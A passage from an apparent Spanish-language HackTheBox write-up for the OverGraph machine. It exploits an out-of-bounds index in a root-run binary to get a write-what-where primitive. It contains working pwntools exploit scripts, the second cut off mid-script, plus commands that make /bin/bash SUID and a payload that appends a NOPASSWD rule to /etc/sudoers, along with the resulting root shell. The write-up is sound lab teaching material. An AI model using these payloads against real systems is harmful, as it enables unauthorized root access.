<span class="code-dark-blue">0x404120</span> &lt;<span class="code-dark-yellow">message_array</span>&gt;:       0x0000000000405830      0x0000000000000000  
<span class="code-dark-blue">0x404130</span> &lt;<span class="code-dark-yellow">message_array</span>+16&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404140</span> &lt;<span class="code-dark-yellow">message_array</span>+32&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404150</span> &lt;<span class="code-dark-yellow">message_array</span>+48&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404160</span> &lt;<span class="code-dark-yellow">message_array</span>+64&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404170</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404180</span> &lt;<span class="code-dark-yellow">userinfo1</span>&gt;:   0x0000000066647361      0x0000000000000000
<span class="code-dark-blue">0x404190</span> &lt;<span class="code-dark-yellow">userinfo1</span>+16&gt;:        0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4041a0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+32&gt;:        0x0000000000000000      0x614c22206f686365
<span class="code-dark-blue">0x4041b0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+48&gt;:        0x2064657355207473      0x7461642824206e4f
<span class="code-dark-blue">0x4041c0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+64&gt;:        0x2f203e3e20222965      0x2f676f6c2f726176
<span class="code-dark-blue">0x4041d0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+80&gt;:        0x0074726f7065726b      0x0000000000000000
<span class="code-dark-blue">0x4041e0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+96&gt;:        0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4041f0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+112&gt;:       0x0000000000000000      0x41414141415d4468
<span class="code-dark-blue">0x404200</span> &lt;<span class="code-dark-yellow">userinfo1</span>+128&gt;:       0x000a544141415641      0x74706f2f00000000
<span class="code-dark-blue">0x404210</span> &lt;<span class="code-dark-yellow">userinfo1</span>+144&gt;:       0x73612f317672632f      0x0000000000006664
<span class="code-dark-blue">0x404220</span> &lt;<span class="code-dark-yellow">userinfo1</span>+160&gt;:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404230</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404240</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404250</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>Y esta dirección contiene nuestro mensaje (como <em>chunk</em> en el <em>heap</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx 0x0000000000405830 - 0x10
<span class="code-dark-blue">0x405820</span>:       0x0000000000000000      0x00000000000000b1  
<span class="code-dark-blue">0x405830</span>:       0x0000000041414141      0x0000000000000000
<span class="code-dark-blue">0x405840</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405850</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405860</span>:       0x0000000000000000      0x4242424200000000
<span class="code-dark-blue">0x405870</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405880</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405890</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4058a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4058b0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4058c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4058d0</span>:       0x0000000000000000      0x0000000000020731
<span class="code-dark-blue">0x4058e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4058f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405900</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>Al utilizar la función <code>edit</code>, el programa espera que pongamos un índice. Y la dirección en la que escribe se calcula como <code>message_array + index * 8</code>. Como el binario no cuenta con la protección PIE, <code>message_array</code> tendrá una dirección fija (<code>0x404120</code>). Por tanto, la dirección objetivo será <code>0x404120 + index * 8</code>.</p><p>Como podemos controlar lo que ponemos de nombre de usuario (guardado en <code>userinfo1</code>, <code>0x404180</code>), podemos introducir aquí una dirección en la que queremos escribir. Y para decirle al programa que use nuestro nombre de usuario como dirección, tenemos que usar <code>12</code> como índice (<code>12 = (0x404180 - 0x404120) / 8</code>). Vamos a probarlo ahora mismo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>continue
Continuing.
3
Enter number to edit: 12
Message Title: XXXX

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x00007ffff7a95f5f</span> in <span class="code-dark-yellow">_IO_vfscanf_internal</span> (<span class="code-dark-cyan">s</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">format</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">argptr=argptr@entry</span>=0x7fffffffe578, <span class="code-dark-cyan">errp=errp@entry</span>=0x0) at <span class="code-dark-green">vfscanf.c</span>:2  
892
2892    vfscanf.c: No such file or directory.
</code></pre></div><p>Obtenemos una violación de segmento (<em>segmentation fault</em>), porque el programa está tratando de escribir <code>XXXX</code> en la dirección <code>0x66647361</code> (<code>asdf</code> en formato hexadecimal, <em>little-endian</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x7ffff7a95f5f</span> &lt;<span class="code-dark-yellow">_IO_vfscanf_internal</span>+12911&gt;: mov    BYTE PTR [r14],r8b  
<span class="code-green">gef➤  </span>p $r14
$1 = 0x66647361
<span class="code-green">gef➤  </span>p $r8
$2 = 0x58
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Entonces podemos modificar datos arbitrarios en la memoria. Aquí tenemos muchas posibilidades. Una es modificar el comando que está guardado en <code>userinfo1 + 40</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Last Used On $(date)"</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> /var/log/kreport</span>  
</code></pre></div><p>Lo podemos cambiar a <code>chmod 4755 /bin/bash</code>, por ejemplo. Como el proceso está corriendo como <code>root</code>, el comando será ejecutado por <code>root</code>. Para hacer esto, el nombre de usuario tiene que ser la dirección de <code>userinfo1 + 40</code> (<code>0x404180 + 40 = 0x4041a8</code>). Luego, podemos usar un <em>script</em> sencillo con <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> para realizar el <em>exploit</em> (<a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/exploit_rce.py"><code>exploit_rce.py</code></a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">, </span><span class="mtk1">log</span><span class="mtk1">, p64, </span><span class="mtk8 mtku">remote</span><span class="mtk1">, </span><span class="mtk8 mtku">sys</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'nreport_patched'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'hD]AAAAAAVAAAT'</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Usage: python3 </span><span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4"> &lt;ip&gt; &lt;port&gt;'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter Your Token: '</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter Name: '</span><span class="mtk1">, p64(</span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.sym.userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">40</span><span class="mtk1">))</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message Title: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'AAAA'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'BBBB'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter number to edit: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'12'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message Title: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'chmod 4755 /bin/bash</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'5'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Nótese que el binario está corriendo en local con <code>socat</code> en <code>127.0.0.1:9851</code>, por lo que necesitamos hacer un reenvío de puertos a nuestra máquina de atacante. Esto se puede hacer con SSH (<code>ENTER + ~C</code> para acceder a la interfaz <code>ssh></code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ls -l /bin/bash  
-rwxr-xr-x 1 root root 1183448 Apr 18 09:14 <span class="code-green">/bin/bash</span>
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$
ssh&gt; -L 9851:127.0.0.1:9851
Forwarding port.

<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$
</code></pre></div><p>Y ahora lanzamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit_rce.py</span> 127.0.0.1 9851
[<span class="code-blue">*</span>] './nreport_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3fd000)</span>
    RUNPATH:  <span class="code-dark-red">b'./libc'</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9851: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9851
</code></pre></div><p>Y vemos que <code>/bin/bash</code> es ahora SUID, por lo que podemos ejecutar Bash como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ls -l /bin/bash  
-rwsr-xr-x 1 root root 1183448 Apr 18 09:14 <span class="code-white code-bg-red">/bin/bash</span>
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ bash -p
bash-5.0# cat /root/root.txt
413a25bd4e358c7863dd13455c053247
</code></pre></div><p>Solo por diversión, otra opción es modificar la ruta <code>/opt/crv1/ + &lt;username></code> para que sea <code>/etc/passwd</code>, <code>/etc/sudoers</code> o <code>/root/.ssh/authorized_keys</code> y añadir los datos necesarios para escalar privilegios usando la función <code>report</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">report</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8c</span><span class="mtk1">, </span><span class="mtk4">"a"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"1.Report Specific Message"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"2.Report All Messages"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Index: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (Arryindex </span><span class="mtk5">&lt;</span><span class="mtk1"> index) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Invalid Index"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">fprintf</span><span class="mtk1">(fp,</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4"> "</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk8">fprintf</span><span class="mtk1">(fp,</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"File stored At: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">40420c</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> Arryindex; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(fp,</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4"> "</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(fp,</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"File stored At: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">40420c</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Option"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Básicamente, esta función escribe nuestros mensajes en un archivo <code>/opt/crv1/ + &lt;username></code> (como <code>root</code>).</p><p>Antes de descubrir la vulnerabilidad de <code>edit</code>, pensé que se podrían introducir varios <code>../</code> en el usuario y hacer que el programa escribiera en <code>/opt/crv1/../../etc/sudoers</code> (o cualquier otro archivo). Pero no funciona porque <code>/opt/crv1</code> no existe:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ls -la /opt  
total 16
drwxr-xr-x  3 root root 4096 Apr 12 17:38 <span class="code-blue">.</span>
drwxr-xr-x 18 root root 4096 Apr 12 17:38 <span class="code-blue">..</span>
-rw-r--r--  1 root root  168 Apr  8 18:39 conv.sh
drwxr-xr-x  3 root root 4096 Apr 12 17:38 <span class="code-blue">google</span>
</code></pre></div><p>Usando la primitiva <em>write-what-where</em>, podemos modificar la ruta para que sea <code>/etc/sudoers</code> y luego añadir <code>user ALL=NOPASSWD:ALL</code> (nótese que el archivo se abre en modo <code>"a"</code>, que significa añadir, <em>append</em>).</p><p>La dirección de la ruta es <code>userinfo1 + 140</code> (<code>0x404180 + 140 = 0x40420c</code>). Aquí hay un problema, porque <code>\x0c</code> se considera carácter de salto de línea por <code>fgets</code> (de hecho, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code> y <code>\x0d</code>), por lo que no funcionará. Para evitar esto, podemos escribir en <code>0x40420e</code> usando <code>pt/../etc/sudoers</code>, de manera que la ruta quede como <code>/opt/../etc/sudoers</code>.</p><p>La manera en la que los datos se escriben es <code>&lt;message> &lt;message-title></code>, por lo que podemos aprovecharnos del espacio en blanco y separar <code>user</code> y <code>ALL=NOPASSWD:ALL</code> en nuestro <em>payload</em>.</p><p>Este será el código del <em>exploit</em> para escribir en <code>/etc/sudoers</code> (<a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/exploit_write.py"><code>exploit_write.py</code></a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">, </span><span class="mtk1">log</span><span class="mtk1">, p64, </span><span class="mtk8 mtku">remote</span><span class="mtk1">, </span><span class="mtk8 mtku">sys</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'nreport_patched'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'hD]AAAAAAVAAAT'</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Usage: python3 </span><span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4"> &lt;ip&gt; &lt;port&gt;'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter Your Token: '</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter Name: '</span><span class="mtk1">, p64(</span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.sym.userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">140</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">))</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
